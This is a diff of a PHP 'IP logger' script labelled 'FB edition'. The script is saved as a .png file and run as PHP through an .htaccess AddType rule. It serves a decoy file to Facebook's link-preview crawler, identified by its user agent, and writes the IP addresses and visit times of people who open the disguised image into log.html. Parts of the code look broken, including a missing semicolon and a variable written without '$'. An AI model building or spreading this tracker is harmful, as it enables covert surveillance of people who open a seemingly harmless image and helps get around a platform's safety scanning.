@@ -1,8 +1,10 @@
 <?php
 //creditz 2 @typhoid
-//put this in .htmlaccess AddType application/x-httpd-php .png
-//save this php file as .png or any other image extension you put in the htmlaccess
-//thnx ozkar
+//FB edition
+//--IMPORTANT-- put this in .htmlaccess without quotation marks " AddType application/x-httpd-php .png "
+//replace h were it says .png in the line added to the htmlaccess with 
+//whatever you  save this php file as. if you're keeping it as it is then save this logger file as .png on the server
+//special thanks to ozkar  
 extract($_SERVER);
 
 
@@ -12,7 +14,7 @@ $name = 'picturename.jpg';
 $zuckerberg = 'fggt.txt'
 if($HTTP_USER_AGENT =='facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)')
 {
-// change 'r'to rb if using another picture
+// change 'r' below to rb if using another picture instead of a text file
 $fp = fopen($zuckerberg,'r');
 
 }
@@ -27,7 +29,7 @@ flock($fp, 3);
 fclose($fp);
 
 
-//log visitors ip
+//log visitors ip to log.html
 $file = fopen('log.html', 'a');
 //time
 stime = date('H:i dS F');
